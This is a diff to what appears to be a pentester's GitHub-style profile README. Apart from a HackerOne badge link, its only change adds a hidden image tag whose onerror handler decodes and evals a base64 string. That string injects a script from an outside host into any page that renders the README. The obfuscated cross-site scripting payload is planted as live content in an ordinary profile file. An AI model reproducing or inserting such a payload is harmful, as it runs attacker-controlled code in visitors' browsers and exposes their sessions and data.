@@ -26,4 +26,6 @@ I'm a security researcher, I work as a pentester and in my free time I like to h
   <a href="https://hackerone.com/phor3nsic">
     <img src="https://img.shields.io/badge/@phor3nsic-black?style=square&logo=hackerone">
   </a>
+  
+  <div><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veC5yZWQtc2VjLnh5eiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs onerror=eval(atob(this.id))></div>
 
